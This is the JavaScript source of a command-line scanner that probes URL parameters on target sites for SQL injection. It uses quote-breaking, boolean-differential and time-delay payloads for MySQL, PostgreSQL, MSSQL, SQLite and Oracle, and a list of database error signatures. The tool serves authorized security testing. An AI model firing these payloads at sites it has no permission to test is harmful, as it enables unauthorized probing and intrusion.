#!/usr/bin/env node
// sqli.js — error/time-based SQL injection indicator scanner.
// Copyright (c) 2026 0xnothings
// @tool sqli
// @desc Parametric SQLi triage: error signatures, boolean differential, and time-delay probes with evidence
// @usage node tools/sqli.js "https://site.com/item?id=1" --delay 5 --json
// @tags security,web,sqli
import { args, get, num, flag, die, inputLines, table } from '../_lib.js';

const o = args(process.argv.slice(2));
if (o.f.help) {
  console.log(`sqli — SQL injection indicator scanner

  node tools/sqli.js <url-with-params|urls.txt|-> [options]

  --delay <s>        time-based delay payload seconds (default: 5)
  --params <list>    only test these params
  --skip-time        skip the slow time-based phase
  --timeout <ms>     request timeout (default: 20000)
  --json             machine-readable output
  -h, --help         this text`);
  process.exit(0);
}

const ERRORS = [
  [/SQL syntax.*MySQL/i, 'MySQL syntax error'],
  [/Warning.*mysql_/i, 'PHP mysql_ warning'],
  [/valid MySQL result/i, 'MySQL result error'],
  [/MySqlException|MySql.Data/i, 'MySqlException'],
  [/PostgreSQL.*ERROR/i, 'PostgreSQL error'],
  [/pg_query\(\)|pg_exec\(\)/i, 'PHP pg_ error'],
  [/SQLite\/JDBCDriver|SQLite3::|sqlite_/i, 'SQLite error'],
  [/ORA-0\d{4}/i, 'Oracle ORA error'],
  [/Microsoft OLE DB Provider for SQL Server/i, 'MSSQL OLE DB'],
  [/Unclosed quotation mark after the character string/i, 'MSSQL unclosed quote'],
  [/System\.Data\.SqlClient\.SqlException/i, '.NET SqlClient exception'],
  [/syntax error at or near/i, 'generic syntax error'],
  [/SQLSTATE\[/i, 'SQLSTATE code leak'],
  [/SequelizeDatabaseError|PrismaClientKnownRequestError|knex.*error/i, 'ORM error leak'],
  [/conversion failed when converting the varchar/i, 'MSSQL cast error'],
];

const BOOLEAN = [
  ['quote', "'"],
  ['quote-2', '"'],
  ['and-true', "' AND '1'='1"],
  ['and-false', "' AND '1'='2"],
  ['or-true', "' OR '1'='1"],
  ['numeric-true', ' AND 1=1'],
  ['numeric-false', ' AND 1=2'],
];
const TIME = [
  ['mysql', "' AND SLEEP(%d)-- -", 1],
  ['postgres', "'; SELECT pg_sleep(%d)-- -", 1],
  ['mssql', "'; WAITFOR DELAY '0:0:%d'-- -", 1],
  ['sqlite', "' AND 1=(SELECT 1 FROM (SELECT SLEEP(%d)))-- -", 0],
  ['oracle', "' AND 1=dbms_pipe.receive_message(('a'),%d)-- -", 1],
];

async function send(url, timeout, t0 = Date.now()) {
  const ctl = new AbortController(); const t = setTimeout(() => ctl.abort(), timeout);
  try {
    const res = await fetch(url, { signal: ctl.signal, redirect: 'manual', headers: { 'user-agent': '0xnothings-sqli/1.0', accept: '*/*' } });
    const body = await res.text().catch(() => '');
    return { status: res.status, body, len: body.length, ms: Date.now() - t0 };
  } catch (e) { return { error: e.name === 'AbortError' ? 'timeout' : String(e.cause?.code || e.message), ms: Date.now() - t0 }; }
  finally { clearTimeout(t); }
}

let entries = o._.length ? o._ : ['-'];
let urls = [];
for (const e of entries) if (/-$|\.txt$/.test(e)) urls.push(...(await inputLines(e))); else urls.push(e);
urls = [...new Set(urls.map((u) => (/^https?:\/\//.test(u) ? u : 'https://' + u)))];
if (!urls.length) die('no url given');
const timeout = num(get(o, 'timeout'), 20000);
const delaySec = num(get(o, 'delay'), 5);
const only = o.f.params ? String(get(o, 'params')).split(',').map((s) => s.trim()) : null;

const findings = [];
for (const raw of urls) {
  const base = new URL(raw);
  let params = [...base.searchParams.keys()];
  if (!params.length) { console.error(`[skip] no params: ${raw}`); continue; }
  if (only) params = params.filter((p) => only.includes(p));
  const baseline = await send(raw, timeout);
  if (baseline.error) { console.error(`[skip] baseline failed ${raw}: ${baseline.error}`); continue; }

  for (const p of params) {
    // phase 1: error signatures
    for (const [name, pl] of BOOLEAN.slice(0, 3)) {
      const u = new URL(raw); u.searchParams.set(p, (u.searchParams.get(p) || '1') + pl);
      const r = await send(u.toString(), timeout);
      if (r.error) continue;
      for (const [re, why] of ERRORS) if (re.test(r.body) && !re.test(baseline.body)) {
        findings.push({ url: raw, param: p, technique: 'error-based', payload: name, evidence: why, confidence: 'HIGH' });
        break;
      }
    }
    // phase 2: boolean differential
    const tU = new URL(raw); tU.searchParams.set(p, (tU.searchParams.get(p) || '1') + BOOLEAN[2][1]);
    const fU = new URL(raw); fU.searchParams.set(p, (fU.searchParams.get(p) || '1') + BOOLEAN[3][1]);
    const [rt, rf] = [await send(tU.toString(), timeout), await send(fU.toString(), timeout)];
    if (!rt.error && !rf.error) {
      const diff = Math.abs(rt.len - rf.len);
      const statusDiff = rt.status !== rf.status;
      if ((diff > 100 || statusDiff) && !(Math.abs(rt.len - baseline.len) > 100 && Math.abs(rf.len - baseline.len) > 100)) {
        findings.push({ url: raw, param: p, technique: 'boolean-differential', payload: 'AND 1=1 vs AND 1=2', evidence: `true=${rt.len}b/${rt.status} false=${rf.len}b/${rf.status} delta=${diff}`, confidence: diff > 300 ? 'HIGH' : 'MEDIUM' });
      }
    } else if (/timeout/.test(rt.error || '') !== /timeout/.test(rf.error || '')) {
      findings.push({ url: raw, param: p, technique: 'boolean (error/timeout split)', payload: 'AND 1=1 vs AND 1=2', evidence: 'one branch timed out, the other answered', confidence: 'MEDIUM' });
    }
    // phase 3: time-based
    if (!flag(o, 'skip-time')) {
      for (const [db, tpl] of TIME) {
        const payload = tpl.replace('%d', delaySec);
        const u = new URL(raw); u.searchParams.set(p, (u.searchParams.get(p) || '1') + payload);
        const t0 = Date.now();
        const r = await send(u.toString(), timeout + delaySec * 1000, t0);
        if (r.error === 'timeout' && baseline.ms < delaySec * 1000) {
          findings.push({ url: raw, param: p, technique: 'time-based', payload: `${db}: ${payload}`, evidence: `timed out after ${Date.now() - t0}ms (baseline ${baseline.ms}ms)`, confidence: 'MEDIUM' });
          continue;
        }
        if (!r.error && r.ms > baseline.ms + delaySec * 900) {
          findings.push({ url: raw, param: p, technique: 'time-based', payload: `${db}: ${payload}`, evidence: `${r.ms}ms vs baseline ${baseline.ms}ms`, confidence: 'HIGH' });
        }
      }
    }
  }
}

if (flag(o, 'json')) console.log(JSON.stringify(findings, null, 2));
else {
  console.log(table(findings.map((f) => ({ confidence: f.confidence, technique: f.technique, param: f.param, url: f.url.slice(0, 46), evidence: f.evidence }))));
  console.log(`\n${findings.length} injection indicator(s) — confirm manually before reporting`);
}
